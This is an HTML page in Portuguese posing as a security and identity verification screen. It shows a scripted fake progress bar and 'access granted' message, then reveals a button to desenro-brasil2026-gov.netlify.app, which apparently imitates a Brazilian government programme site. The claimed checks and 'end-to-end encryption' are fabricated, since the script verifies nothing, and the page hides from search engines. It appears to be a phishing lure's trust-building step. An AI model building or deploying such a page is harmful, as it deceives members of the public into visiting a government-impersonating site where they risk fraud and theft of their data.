<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex,nofollow" />
  <title>Verificação de Identidade - Segurança</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    html,body{min-height:100%}
    body{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
      background:#0f172a;
      color:#f8fafc;
    }
    .card{
      position:relative;
      width:100%;
      max-width:480px;
      background:#1e293b;
      border-radius:24px;
      padding:40px 32px;
      text-align:center;
      box-shadow:0 20px 50px rgba(0,0,0,.4);
      border:1px solid rgba(255,255,255,.08);
      overflow:hidden;
    }
    .card::before{
      content:'';
      position:absolute;
      top:0;
      left:0;
      right:0;
      height:4px;
      background:linear-gradient(90deg, #3b82f6, #6366f1, #a855f7);
    }
    .shield-wrapper{
      position:relative;
      width:80px;
      height:80px;
      margin:0 auto 24px;
      display:grid;
      place-items:center;
    }
    .shield-pulse{
      position:absolute;
      inset:0;
      border-radius:50%;
      background:rgba(59,130,246,.15);
      animation:pulse 2s infinite ease-in-out;
    }
    @keyframes pulse{
      0%, 100%{transform:scale(1);opacity:.5}
      50%{transform:scale(1.25);opacity:.15}
    }
    .shield{
      position:relative;
      width:64px;
      height:64px;
      display:grid;
      place-items:center;
      border-radius:50%;
      background:#1e293b;
      border:2px solid #3b82f6;
      box-shadow:0 0 15px rgba(59,130,246,.3);
    }
    .shield svg{width:30px;height:30px;fill:none;stroke:#60a5fa;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
    h1{font-size:24px;line-height:1.2;font-weight:700;margin-bottom:8px;color:#fff}
    .lead{font-size:15px;color:#94a3b8;margin-bottom:28px}
    .status-badge{
      display:inline-flex;
      align-items:center;
      gap:8px;
      padding:6px 16px;
      background:rgba(30,41,59,.8);
      border:1px solid rgba(255,255,255,.1);
      border-radius:999px;
      font-size:13px;
      color:#cbd5e1;
      margin-bottom:20px;
    }
    .dot{
      width:8px;
      height:8px;
      border-radius:50%;
      background:#3b82f6;
      box-shadow:0 0 8px #3b82f6;
    }
    .progress{
      height:8px;
      overflow:hidden;
      margin:20px auto 0;
      border-radius:999px;
      background:#334155;
    }
    .progress span{
      display:block;
      width:0;
      height:100%;
      border-radius:inherit;
      background:linear-gradient(90deg, #3b82f6, #6366f1);
      transition:width 3.2s cubic-bezier(.4,0,.2,1);
    }
    .progress span.loading{width:100%}
    .progress span.done{background:#22c55e}
    .substatus{font-size:13px;color:#64748b;margin-top:12px;line-height:1.5}
    .action-btn{
      display:none;
      align-items:center;
      justify-content:center;
      width:100%;
      margin-top:24px;
      padding:14px 22px;
      border:0;
      border-radius:12px;
      background:linear-gradient(135deg, #2563eb, #1d4ed8);
      color:#fff;
      font-size:16px;
      font-weight:600;
      text-decoration:none;
      cursor:pointer;
      box-shadow:0 4px 14px rgba(37,99,235,.4);
      transition:all .2s ease;
    }
    .action-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(37,99,235,.6)}
    .footer{margin-top:28px;font-size:12px;color:#475569;display:flex;align-items:center;justify-content:center;gap:6px}
  </style>
</head>
<body>
  <main class="card" aria-live="polite">
    <div class="shield-wrapper" aria-hidden="true">
      <div class="shield-pulse"></div>
      <div class="shield">
        <svg viewBox="0 0 24 24">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          <path d="m9 12 2 2 4-4"></path>
        </svg>
      </div>
    </div>

    <h1>Verificação de Segurança</h1>
    <p class="lead">Analisando parâmetros de conexão...</p>

    <div class="status-badge">
      <span class="dot" id="statusDot"></span>
      <span id="status">Validando sua sessão...</span>
    </div>

    <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
    
    <p class="substatus">Processo automático de proteção contra acessos indevidos.</p>

    <a class="action-btn" href="https://desenro-brasil2026-gov.netlify.app/" id="continueBtn">Continuar para a página</a>

    <div class="footer">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5g 0 0 1 10 0v4"></path></svg>
      Conexão encriptada de ponta a ponta
    </div>
  </main>

  <script>
    const status = document.getElementById('status');
    const statusDot = document.getElementById('statusDot');
    const progressBar = document.getElementById('progressBar');
    const continueBtn = document.getElementById('continueBtn');

    requestAnimationFrame(() => progressBar.classList.add('loading'));

    setTimeout(() => {
      progressBar.classList.add('done');
      status.textContent = 'Acesso liberado com sucesso!';
      statusDot.style.background = '#22c55e';
      statusDot.style.boxShadow = '0 0 8px #22c55e';
      continueBtn.style.display = 'inline-flex';
    }, 3300);
  </script>
</body>
</html>
